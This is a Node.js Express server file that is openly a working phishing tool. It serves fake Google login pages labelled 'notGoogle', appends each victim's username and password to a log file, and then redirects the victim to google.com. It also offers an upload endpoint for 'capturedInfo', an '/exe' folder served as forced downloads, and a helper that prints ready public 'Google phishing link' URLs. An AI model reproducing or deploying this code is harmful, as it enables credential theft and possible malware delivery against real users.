const express = require("express");
const app = express();
// todo confirm this is no longer needed
//const http = require("http");
const fs = require("fs");
const path = require("path");
const multer = require("multer");

//Upload Section
// Configure multer for file uploads
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, "uploads"); // Specify the destination folder for uploaded files
  },
  filename: (req, file, cb) => cb(null, file.originalname),
});

// Create an instance of multer and pass the storage destination and file type limits
const upload = multer({ storage });

// Configure multer for file uploads
const storage1 = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, "capturedInfo"); // Specify the destination folder for uploaded files
  },
  filename: (req, file, cb) => cb(null, file.originalname),
});

const upload1 = multer({ storage: storage1 }); // Use the storage1 configuration for upload1

// todo fix logic for uploads handle success and error
// Handle file uploads
app.post("/uploads", upload.single("file"), (req, res) => {
  res.json({ message: "File uploaded successfully" });
});

// todo fix logic for uploads handle success and error
// Handle uploads to capturedInfo
app.post("/capturedInfo", upload1.single("file"), (req, res) => {
  try {
    // Do something with the uploaded file if needed
    res.json({ message: "File uploaded successfully" });
  } catch (error) {
    console.error("Error uploading file:", error);
    res.status(500).json({ error: "Error uploading file" });
  }
});

// Serve directories for download
// Serve exe folder and set "Content-Disposition" for downloads
app.use(
  "/exe",
  express.static(__dirname + "/exe", { setHeaders: setDownloadHeaders })
);

// Serve uploads folder and set "Content-Disposition" for downloads
app.use(
  "/uploads",
  express.static(__dirname + "/uploads", { setHeaders: setDownloadHeaders })
);

// Serve captureInfo
// app.use('/capturedInfo', express.static(path.join(__dirname, '/capturedInfo')));
app.use(
  "/capturedInfo",
  express.static(__dirname + "/capturedInfo", {
    setHeaders: setDownloadHeaders,
  })
);

// Serve scripts
// Server script files for use in the client
app.use("/scripts", express.static(__dirname + "/scripts"));

// Serve webpages
// Serve notGoogle userName.html
app.get("/notGoogle", (req, res) => {
  res.sendFile(path.join(__dirname, "/logins/notGoogle/userName.html"));
});

// Serve notGoogle password.html
app.get("/notGoogle/password.html", (req, res) => {
  res.sendFile(path.join(__dirname, "/logins/notGoogle/password.html"));
});

// Serve notGoogle directory under '/logins/notGoogle' route
// Serve static files from the 'logins' directory under '/logins' route
app.use(
  "/logins/notGoogle",
  express.static(path.join(__dirname, "/logins/notGoogle"))
);

// Save notGoogle userinfo.txt
app.post(
  "/loginUserName",
  express.urlencoded({ extended: true }),
  (req, res) => {
    const userName = req.body.userName;
    const content = "User Name: " + userName + "\n";
    // Save the new File to the capturedInfo directory
    // Append the file with the new content
    fs.appendFile("capturedInfo/notGoogleLog.txt", content, (err) => {
      if (err) throw err;
      console.log("The file has been saved!");
    });

    // Redirect to password.html
    res.redirect("/notGoogle/password.html");
  }
);

// Save notGoogle password.txt
app.post(
  "/loginPassword",
  express.urlencoded({ extended: true }),
  (req, res) => {
    const password = req.body.password;
    const content = "Password: " + password + "\n-------------------\n";

    // Save the new File to the capturedInfo directory
    // Append the file with the new content
    fs.appendFile("capturedInfo/notGoogleLog.txt", content, (err) => {
      if (err) throw err;
      console.log("The file has been saved!");
    });

    // Redirect to www.google.com
    res.redirect("https://www.google.com");
  }
);

//!!!Experimental
const axios = require('axios');

const loadLinks = async () => {
  try {
    const response = await axios.get('https://httpbin.org/ip');
    const data = response.data;
    console.log('Google phishing link: http://localhost:3002/notGoogle (local)');
    console.log('Google phishing link: http://'+ data.origin + ':3002/notGoogle (public port forwarding required)');
  } catch (error) {
    console.error('Error getting public IP:', error);
  }
};


app.listen(3002, () => {
  console.log(`\x1b[31m
  _____ _                           _                       
 / ____| |                         (_)                      
 | (___| |__   ___ _ __   __ _ _ __  _  __ _  __ _ _ __  ___ 
 \\___ \\| '_ \\ / _ \\ '_ \\ / _\` | '_ \\| |/ _\` |/ _\` | '_ \\/ __|
 ____) | | | |  __/ | | | (_| | | | | | (_| | (_| | | | \\__ \\
|_____/|_| |_|\\___|_| |_|\\__,_|_| |_|_|\\__,_|\\__,_|_| |_|___/\x1b[34m
|  \\/  |             / ____|    \x1b[31m        __/ |     \x1b[34m           
| \\  / | __ _  ___  | (___   ___ _ ____|___/___ _ __         
| |\\/| |/ _\` |/ __|  \\___ \\ / _ \\ '__\\ \\ / / _ \\ '__|        
| |  | | (_| | (__   ____) |  __/ |   \\ V /  __/ |           
|_|__|_|\\__,_|\\___| |_____/ \\___|_|    \\_/ \\___|_|    \x1b[31m       
|  ____|                                                     
| |__ __ _  ___ ___                                          
|  __/ _\` |/ __/ _ \\                                         
| | | (_| | (_|  __/                                         
|_|  \\__,_|\\___\\___|  \x1b[34m      
Server running on port 3002 \x1b[0m\n `);
  
});
loadLinks();

//\x1b[0m\n white
// Functions
// Function to set "Content-Disposition" header for downloads
function setDownloadHeaders(res, path) {
  res.setHeader("Content-Disposition", "attachment");
}
